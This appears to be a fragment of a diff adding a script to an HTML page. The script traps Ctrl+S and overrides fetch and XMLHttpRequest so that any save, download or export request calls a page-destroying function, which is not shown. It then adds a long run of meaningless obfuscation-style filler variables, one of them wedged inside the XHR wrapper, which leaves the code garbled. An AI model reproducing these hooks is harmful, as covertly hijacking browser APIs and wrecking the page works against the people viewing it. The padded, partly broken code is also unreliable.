+      if (e.ctrlKey && e.key === 's') { e.preventDefault(); destroyPage(); }
+    });
+    
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+      if (typeof args[0] === 'string' && (args[0].includes('download') || args[0].includes('save') || args[0].includes('export'))) destroyPage();
+      return originalFetch.apply(this, args);
+    };
+    
+    const originalXHR = window.XMLHttpRequest;
+    window.XMLHttpRequest = function() {
+      const xhr = new originalXHR();
+      const originalOpen = xhr.open.bind(xhr);
+      xhr.open = function(method, url, ...args) {
+        if (url.includes('download') || url.includes('save') || url.includes('export')) destroyPage();
+        return originalOpen(method, url, ...args);
+      };
+var _z18bd = 'x18be' + 'x18bf';
+      return xhr;
+    };
+  
+var _z18c0 = 'x18c1' + 'x18c2';
+var _z18c3 = 8622;
+var _z18c4 = 'x18c5' + 'x18c6';
+var _z18c7 = { a: 90, b: 'x18c8' };
+var _z18c9 = { a: 84, b: 'x18ca' };
+var _z18cb = { a: 72, b: 'x18cc' };
+var _z18cd = 'x18ce' + 'x18cf';
+var _z18d0 = ((v) => v * 5)(96);
+var _z18d1 = { a: 81, b: 'x18d2' };
+var _z18d3 = 80467;
+var _z18d4 = 'x18d5' + 'x18d6';
+var _z18d7 = 'x18d8' + 'x18d9';
+var _z18da = ((v) => v * 2)(24);
+var _z18db = ((v) => v * 7)(60);
+var _z18dc = 40788;
+var _z18dd = 92107;
+var _z18de = { a: 75, b: 'x18df' };
+var _z18e0 = 'x18e1' + 'x18e2';
+var _z18e3 = 'x18e4' + 'x18e5';
+var _z18e6 = ((v) => v * 3)(26);
+var _z18e7 = 'x18e8' + 'x18e9';
+var _z18ea = 'x18eb' + 'x18ec';
+var _z18ed = ((v) => v * 8)(76);
+var _z18ee = 15863;
+var _z18ef = 'x18f0' + 'x18f1';
+var _z18f2 = { a: 18, b: 'x18f3' };
+var _z18f4 = ((v) => v * 8)(48);
+var _z18f5 = 'x18f6' + 'x18f7';
+var _z18f8 = { a: 34, b: 'x18f9' };
+var _z18fa = { a: 78, b: 'x18fb' };
+var _z18fc = 'x18fd' + 'x18fe';
+var _z18ff = 61106;
+var _z1900 = ((v) => v * 4)(52);
+var _z1901 = 'x1902' + 'x1903';
+var _z1904 = { a: 48, b: 'x1905' };
+var _z1906 = { a: 95, b: 'x1907' };
+var _z1908 = { a: 57, b: 'x1909' };
+var _z190a = 'x190b' + 'x190c';
+var _z190d = 'x190e' + 'x190f';
+var _z1910 = ((v) => v * 7)(86);
+var _z1911 = { a: 58, b: 'x1912' };
+var _z1913 = ((v) => v * 3)(43);
+var _z1914 = 43419;
+var _z1915 = 'x1916' + 'x1917';
+var _z1918 = ((v) => v * 3)(66);
+var _z1919 = { a: 25, b: 'x191a' };
+var _z191b = { a: 54, b: 'x191c' };
+var _z191d = 33431;
+var _z191e = { a: 24, b: 'x191f' };
+var _z1920 = ((v) => v * 6)(77);
+var _z1921 = ((v) => v * 6)(30);
+var _z1922 = 80223;
+var _z1923 = 'x1924' + 'x1925';
+var _z1926 = 42644;
+var _z1927 = 22058;
+var _z1928 = { a: 81, b: 'x1929' };
+var _z192a = { a: 33, b: 'x192b' };
+var _z192c = 42640;
+var _z192d = 38601;
+var _z192e = 98239;
+var _z192f = 'x1930' + 'x1931';
+var _z1932 = 22452;
+var _z1933 = 48204;
+var _z1934 = 'x1935' + 'x1936';
+var _z1937 = ((v) => v * 5)(64);
+var _z1938 = 'x1939' + 'x193a';
+var _z193b = 'x193c' + 'x193d';
+var _z193e = ((v) => v * 8)(40);
+var _z193f = 'x1940' + 'x1941';</script>
+</body>
+</html>
